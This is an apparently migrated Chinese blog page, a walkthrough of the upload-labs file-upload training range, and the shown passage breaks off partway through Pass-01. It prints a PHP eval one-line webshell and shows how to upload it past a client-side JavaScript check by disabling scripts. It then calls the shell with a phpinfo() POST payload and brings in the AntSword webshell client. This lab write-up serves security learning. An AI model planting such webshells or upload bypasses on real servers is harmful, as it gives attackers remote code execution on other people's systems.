@@ -1,0 +1,1443 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文是作者由CSDN博客迁移而来，原文地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;2302_81178149&#x2F;article&#x2F;details&#x2F;145442006?spm&#x3D;1001.2014.3001.5501  我们下面进行下一个漏洞——文件上传的学习。文件上传是常见漏洞之一，是Web安全入门必学漏洞。为探讨清楚文件上传漏洞的诸多细节，我们特选经典的upload-labs进行从入门到进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload-labs通关全详解">
+<meta property="og:url" content="http://example.com/2025/05/04/16upload-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文是作者由CSDN博客迁移而来，原文地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;2302_81178149&#x2F;article&#x2F;details&#x2F;145442006?spm&#x3D;1001.2014.3001.5501  我们下面进行下一个漏洞——文件上传的学习。文件上传是常见漏洞之一，是Web安全入门必学漏洞。为探讨清楚文件上传漏洞的诸多细节，我们特选经典的upload-labs进行从入门到进">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956895.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956669.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956626.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956517.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956755.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956803.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956555.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956188.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958594.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957149.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957685.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957656.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957627.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957893.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957789.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957189.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958372.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957176.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958544.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958737.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958410.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958688.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958631.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958846.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958762.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958742.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959793.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959644.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959574.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959488.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004286.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959423.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959197.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959098.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959103.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959684.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959524.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959137.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959731.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000334.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000641.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000720.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000023.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000391.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005015.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000504.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000150.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000098.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000839.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000664.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005113.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000260.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000410.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000325.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000833.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000620.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000701.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000866.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000121.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001738.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001957.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001355.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001257.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001974.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001886.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001386.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001123.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001327.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001699.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001697.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001561.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001190.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001497.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001259.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001457.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002820.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002452.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002584.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002283.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002393.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002813.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002472.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002464.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002197.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002227.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002946.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002169.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002826.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002899.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002544.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002896.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002835.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002488.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002095.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003714.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003473.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003384.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003641.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003931.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003386.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003426.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003565.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003140.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003575.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003907.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003277.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003226.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005710.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003012.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003286.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003783.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004939.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004917.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004666.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004914.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004610.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004897.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004429.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004604.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004182.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004504.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004219.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004160.png">
+<meta property="article:published_time" content="2025-05-04T09:16:00.000Z">
+<meta property="article:modified_time" content="2025-07-14T05:33:42.737Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956895.png">
+  
+  
+  
+  <title>upload-labs通关全详解 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="upload-labs通关全详解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-04 17:16" pubdate>
+          2025年5月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">upload-labs通关全详解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>本文是作者由CSDN博客迁移而来，原文地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/145442006?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145442006?spm=1001.2014.3001.5501</a></p>
+</blockquote>
+<p>我们下面进行下一个漏洞——文件上传的学习。文件上传是常见漏洞之一，是Web安全入门必学漏洞。为探讨清楚文件上传漏洞的诸多细节，我们特选经典的upload-labs进行从入门到进阶的专项训练。</p>
+<p>在做题过程中，作者把用到的知识进行了全面、详细、系统的总结，所以为了方便学习，查阅完全适配此文的总结是必不可少的（怎么可以光训练不去学习、总结呢）。</p>
+<p>作者的总结：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/145433812" title="文件上传学习总结_文件上传学习 csdn-CSDN博客">文件上传学习总结_文件上传学习 csdn-CSDN博客</a></p>
+<p>除此之外，</p>
+<p>作者进行upload-labs靶场练习时，在环境配置上出了很多问题，吃了很多苦头。为了防止大家踩坑，也为了节省大家的时间，在这里直接给出最简单最有效的配置方法，请见下文。</p>
+<p>upload-labs安装与配置：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/145423743?spm=1001.2014.3001.5501" title="upload-labs安装与配置-CSDN博客">upload-labs安装与配置-CSDN博客</a></p>
+<p>upload-labs介绍见下图，</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956895.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>首先我们要写一个一句话木马文件，上传到服务器</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956669.png" srcset="/img/loading.gif" lazyload></p>
+<p>以我的一句话木马为例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956626.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传一下试试</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956517.png" srcset="/img/loading.gif" lazyload></p>
+<p>失败了，文件类型不正确</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956755.png" srcset="/img/loading.gif" lazyload></p>
+<p>看一下提示，前端过滤</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956803.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么我们怎么才能绕过呢？</p>
+<p>方法一：利用浏览器的机制可以禁用js</p>
+<p>方法二：删除浏览器事件</p>
+<p>先试试禁用js。</p>
+<p>不过在实战中直接禁用js插件会导致一些页面无法正常显示，还是存在着一些缺陷。</p>
+<p>以火狐浏览器为例，按f12，在‘调试器’面板最右边有个设置按钮，禁用js。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956046.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传试试</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956555.png" srcset="/img/loading.gif" lazyload></p>
+<p>在上传路径里找一下，成功上传</p>
+<p>如何获得上传路径？</p>
+<p>大家可以先上传一张图片，上传成功后会显示出上传的图片，然后右击图片——&gt;复制图像链接，图像链接就有上传路径</p>
+<p>找到上传路径，发现是WWW\upload-labs文件夹里的upload，看一下</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956344.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现webshell.php已经躺在里面了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956188.png" srcset="/img/loading.gif" lazyload></p>
+<p>在网站里访问一下木马文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/upload-labs/u</span>pload/webshell.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958594.png" srcset="/img/loading.gif" lazyload></p>
+<p>虽然什么也没显示，但实际上我们已经成功了</p>
+<p>可以用HackBar发送一个POST请求，带上我们一句话木马里的“key”值。</p>
+<p>例如，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">key=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957149.png" srcset="/img/loading.gif" lazyload></p>
+<p>发送后成功显示</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957685.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里我们介绍一下文件上传漏洞的常见利用方式——用‘中国蚁剑’之类的WebShell工具。</p>
+<p>我们这里以用中国蚁剑为例，</p>
+<p>先连接一下网站：右键添加数据</p>
